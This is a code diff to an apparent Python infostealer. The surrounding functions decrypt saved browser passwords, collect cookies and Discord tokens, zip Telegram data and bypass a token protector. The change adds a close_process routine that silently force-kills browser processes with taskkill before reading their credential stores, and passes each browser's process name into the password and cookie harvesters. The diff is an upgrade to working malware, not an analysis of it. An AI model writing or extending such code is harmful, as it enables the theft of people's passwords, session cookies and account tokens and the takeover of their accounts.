@@ -32,6 +32,7 @@ hidewindow = '%Hide%'
 changebio = '%ChangeBio%'
 biotext = '%Text%'
 Drive = '%Drive%'
+close_proc = '%CloseProc'
 
 # WEBSITE UPLOAD 
 
@@ -1682,9 +1683,13 @@ def GetDiscord(path, arg):
 paswWords = []
 Passw = []
 
-def getPassw(path, arg):
+def getPassw(path, arg, process):
 
     try:
+        try:
+            close_process(process)
+        except:
+            pass
         def DecryptValue(Buffer, master_key=None):
             starts = Buffer.decode(encoding='utf8', errors='ignore')[:3]
             if starts == 'v10' or starts == 'v11':
@@ -2064,7 +2069,15 @@ def ZipTelegram(path, arg, procc):
         OtherZip.append([arg, lnik])
     except:
         pass
-
+    
+def close_process(procc):
+    if close_proc == True:
+        try:
+            subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
+        except:
+            pass
+        
+    
 
 def ZipThings(path, arg, procc):
     try:
@@ -2957,8 +2970,12 @@ def cokssite():
     except Exception as e:
         pass
      
-def getCook(path, arg):
+def getCook(path, arg, process):
     try:
+        try:
+            close_process(process)
+        except:
+            pass
         global Cookies, CookiCount
         
         if not os.path.exists(path): 
@@ -3129,12 +3146,12 @@ def gatha():
         Second_Thread.append(Drives)
         
     for patt in browserPaths:
-        pa = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
+        pa = threading.Thread(target=getPassw, args=[patt[0], patt[3], patt[1]])
         pa.start()
         Second_Thread.append(pa)
         
     for patt in browserPaths: 
-        getc = threading.Thread(target=getCook, args=[patt[0], patt[4]])
+        getc = threading.Thread(target=getCook, args=[patt[0], patt[4], patt[1]])
         getc.start()
         Second_Thread.append(getc)
         
@@ -3152,6 +3169,7 @@ def gatha():
         tokq = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
         tokq.start()
         First_Thread.append(tokq)
+        
     btk = threading.Thread(target=bypass_token_protector)
     btk.start()
     First_Thread.append(btk)
